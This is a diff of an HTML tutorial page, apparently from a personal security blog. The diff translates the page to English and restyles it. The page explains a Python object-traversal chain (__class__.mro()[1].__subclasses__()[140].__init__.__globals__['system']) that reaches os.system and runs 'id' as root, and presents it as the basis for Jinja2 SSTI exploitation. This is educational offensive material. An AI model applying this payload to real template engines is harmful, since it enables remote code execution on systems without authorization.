@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 
@@ -16,15 +17,24 @@
         h1 {
             font-size: 40px;
         }
-        p{
-            font-size: 18px; /* Tamanho menor para a frase "Tentativa legal" */
+
+        p {
+            font-size: 18px;
             color: rgb(255, 255, 255);
         }
+
         p.subtitle {
-            font-size: 12px; /* Tamanho menor para a frase "Tentativa legal" */
+            font-size: 12px;
             color: rgb(66, 165, 79);
         }
-
+        p.topic {
+            font-size: 32px;
+            color: rgb(255, 255, 255);
+        }
+        p.Subtopic {
+            font-size: 20px;
+            color: rgb(255, 255, 255);
+        }
         pre {
             font-family: monospace;
             white-space: pre-wrap;
@@ -32,104 +42,144 @@
             background-color: #1a191a;
             padding: 1em;
         }
-        .image-container {
-            max-width: 35%; /* Defina a largura máxima que você deseja */
-        }
-        
+
         .image-container img {
             width: 100%;
             height: auto;
         }
+
+        .image-container {
+            max-width: 30%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        @media (max-width: 480px) {
+            .image-container img {
+                width: 300px;
+                max-width: none;
+            }
+            .image-container {
+                text-align: left; 
+                margin-left: 0; 
+                margin-right: auto; 
+            }
+        }
+        
+        .gif-container img {
+            width: 100%;
+            height: auto;
+        }
+        .gif-container {
+            max-width: 40%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        @media (max-width: 480px) {
+            .gif-container img {
+                width: 380px;
+                max-width: none;
+            }
+            .gif-container {
+                text-align: left; 
+                margin-left: 0; 
+                margin-right: auto;
+            }
+        }
         .highlight {
-            background-color: rgb(195, 232, 180); /* Cor de fundo verde claro */
-            padding: 0.2em 0.5em; /* Espaçamento interno para realçar */
-            border-radius: 4px; /* Borda arredondada */
+            background-color: rgb(195, 232, 180);
+            padding: 0.2em 0.5em;
+            border-radius: 4px;
         }
 
         .green-text {
-            color: rgb(66, 165, 79); /* Cor verde */
+            color: rgb(66, 165, 79);
         }
     </style>
 </head>
 
 <body>
-    <h1>RCE por meio de variável em Python</h1>
+    <h1>RCE via Variable in Python</h1>
     <p class="subtitle">Don't stop hacking</p>
-    <p>Diferente do PHP, no Python, uma variável (seja string, float ou int) é um objeto, o que significa que essa variável possui funções Built-in (que já vêm no core do Python). Um exemplo disso é o <strong>replace</strong>:    </p>
+    <p>Unlike PHP, in Python, a variable (be it string, float, or int) is an object, which means this variable has
+        built-in functions (that come with Python's core). An example of this is <strong>replace</strong>:</p>
     <div class="codehilite">
         <pre><code>
 └─# python3
 Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
->>> variavel = 'Gutierreox8o'
->>> variavel.replace('o','0')
+>>> variable = 'Gutierreox8o'
+>>> variable.replace('o','0')
 'Gutierre0x80'
 >>> 
     </code></pre>
     </div>
-    <p>O replace é uma função que existe dentro do nosso objeto string (Variavel nome).</p>
-    <p>Podemos ver o tipo de classe que a varíavel pertence usando o <strong>__class__</strong> É importante deixar claro que isso não é o tipo da variável, e sim a classe que ela pertence.</p>
+    <p>Replace is a function that exists within our string object (Variable name).</p>
+    <p>We can see the class type that the variable belongs to using <strong>__class__</strong>. It's important to note that
+        this is not the variable's type, but rather the class it belongs to.</p>
     <div class="codehilite">
         <pre><code>
-    &#62;&#62;&#62; variavel.__class__
+    &#62;&#62;&#62; variable.__class__
     &lt;class 'str'&gt;
     &#62;&#62;&#62;
         </code></pre>
     </div>
-    <p>A "variavel" são duas coisas. A String e o objeto.</p>
-    <p>Usando a função <strong>mro()</strong> (Method Resolution Order), podemos acessar individualmente cada um desses objetos:</p>
+    <p>The "variable" is two things. The string and the object.</p>
+    <p>Using the <strong>mro()</strong> function (Method Resolution Order), we can access each of these objects
+        individually:</p>
     <div class="codehilite">
         <pre><code>
-&gt;&gt;&gt; variavel.__class__.mro()
-[&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;]
-&gt;&gt;&gt; variavel.__class__.mro()[1]
-&lt;class &#39;object&#39;&gt;
+&gt;&gt;&gt; variable.__class__.mro()
+[&lt;class 'str'&gt;, &lt;class 'object'&gt;]
+&gt;&gt;&gt; variable.__class__.mro()[1]
+&lt;class 'object'&gt;
 &gt;&gt;&gt;
 
         </code></pre>
     </div>
-    <p>Passei o valor <strong>[1]</strong> para acessar a classe objeto, pois começamos a contar partindo do 0. Se houvesse mais uma classe, teríamos que adaptar e escolher 2, por exemplo.</p>
-    <p>Agora que acessamos a classe objeto, vamos acessar todas as subclasses que existem dentro usando o <strong>__subclasses__()</strong>:</p>
+    <p>I passed the value <strong>[1]</strong> to access the object class because we start counting from 0. If there were
+        one more class, we would have to adapt and choose 2, for example.</p>
+    <p>Now that we have accessed the object class, let's access all the subclasses inside using <strong>__subclasses__()</strong>:</p>
     <div class="codehilite">
         <pre><code>
- &gt;&gt;&gt; variavel.__class__.mro()[1].__subclasses__()
-[&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class...
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()
+[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class...
 &gt;&gt;&gt;
-        </code></pre>        
-    </div>
-    <p>Todas essas são as subclasses que existem dentro da nossa string. É interessante copiar no VS Code e separar em linhas diferentes, em breve entenderá o motivo.</p>
-    <div class="image-container">
-    <img src="C:\Users\gutie\OneDrive\Documentos\Matheus\Vscode\Site-Terminal\Itens\organiza.png" alt="VsCode">
-    </div>
-    <p>No cenário perfeito, podemos procurar alguma subclasse que tenha acesso a alguma função dentro da biblioteca os:    </p>
-    <div class="image-container">
-        <img src="C:\Users\gutie\OneDrive\Documentos\Matheus\Vscode\Site-Terminal\Itens\wrap_close.png" alt="Descrição da imagem">
-    </div>
-    <p>Então, se de alguma forma, conseguirmos entrar dentro da função wrap_close e dentro dessa função voltarmos para a raiz da biblioteca (que é o os) e chamarmos a função system, conseguiríamos executar comandos no sistema:</p>
-    <p>Para entrarmos na função wrap_close, é bem simples. Como isso está em um array(), começamos a contar partindo do zero, então nesse caso, vamos utilizar o valor 140 para a subclasse os._wrap.close:    </p>
-    <div class="codehilite">
-        <pre><code>
-&gt;&gt;&gt; variavel.__class__.mro()[1].__subclasses__()[140]
-&lt;class &#39;os._wrap_close&#39;&gt;
-&gt;&gt;&gt;     
         </code></pre>
     </div>
-    <p>O atributo <strong><span class="green-text">__class__</span></strong> retorna o objeto de classe associado à variável nome. A <strong><span class="green-text">mro()</span></strong> é usada para acessarmos individualmente a string e o objeto da variável. A
-        notação <strong><span class="green-text">[1]</span></strong> indica a posição do objeto (0,1). Você pode usar <strong><span class="green-text">.__subclasses__()</span></strong>
-        para acessar as subclasses, e <strong><span class="green-text">[140]</span></strong> para acessar a função 140, que neste caso, é equivalente ao
-        <strong><span class="green-text">os._wrap_close</span></strong>.</p>
-    <p>A função <strong><span class="green-text">.__init__</span></strong> é usada para voltar para a função construct da os, e
-        <strong><span class="green-text">.__globals__</span></strong> é usada para exibir todas as variáveis e bibliotecas existentes na biblioteca.</p>
-    <p>Agora vamos chamar a função <strong>system</strong> do módulo os e executar algum comando.</p>
-    <div class="codehilite">
-        <pre><code>
-&gt;&gt;&gt; variavel.__class__.mro()[1].__subclasses__()[140].__init__.__globals__[&#39;system&#39;](&#39;id&#39;)
+    <p>All these are the subclasses that exist inside our string. It's interesting to copy this in VS Code and separate
+        it into different lines; you'll understand the reason soon.</p>
+    <div class="image-container">
+        <img src="/Itens/organiza.png" alt="VsCode">
+    </div>
+    <p>In the perfect scenario, we can look for some subclass that has access to a function inside the os library:</p>
+    <div class="image-container">
+        <img src="/Itens/wrap_close.png" alt="Image Description">
+    </div>
+    <p>So, if somehow, we manage to enter the wrap_close function and within this function return to the root of the library (which is os) and call the system function, we could execute commands on the system:</p>
+<p>To enter the wrap_close function, it's quite simple. As this is in an array(), we start counting from zero, so in this case, we will use the value 140 for the os._wrap.close subclass:</p>
+<div class="codehilite">
+    <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()[140]
+&lt;class 'os._wrap_close'&gt;
+&gt;&gt;&gt;     
+    </code></pre>
+</div>
+<p>The <strong><span class="green-text">__class__</span></strong> attribute returns the class object associated with the variable name. <strong><span class="green-text">mro()</span></strong> is used to access the string and object of the variable individually. The notation <strong><span class="green-text">[1]</span></strong> indicates the position of the object (0,1). You can use <strong><span class="green-text">.__subclasses__()</span></strong> to access the subclasses, and <strong><span class="green-text">[140]</span></strong> to access function 140, which in this case, is equivalent to <strong><span class="green-text">os._wrap_close</span></strong>.</p>
+<p>The <strong><span class="green-text">.__init__</span></strong> function is used to go back to the construct function of os, and <strong><span class="green-text">.__globals__</span></strong> is used to display all variables and libraries existing in the library.</p>
+<p>Now let's call the <strong>system</strong> function from the os module and execute a command.</p>
+<div class="codehilite">
+    <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()[140].__init__.__globals__['system']('id')
 uid=0(root) gid=0(root) groups=0(root)
 0
-        </code></pre>
-    <p>Isso é utilizado para explora SSTI em Jinja2, a lógica é exatamente a mesma, óbviamente, existem algumas diferenças e nem sempre a os._wrap.close vai estar disponível, mas usando essa lógica, você pode acessar outra subclasse que importe a OS.
-    </p>
-    </div>
+    </code></pre>
+<p>This is used for SSTI exploitation in Jinja2. The logic is exactly the same. Obviously, there are some differences, and os._wrap.close might not always be available. However, using this logic, you can access another subclass that imports the OS.
+</p>
+</div>
 </body>
+
 
 </html>
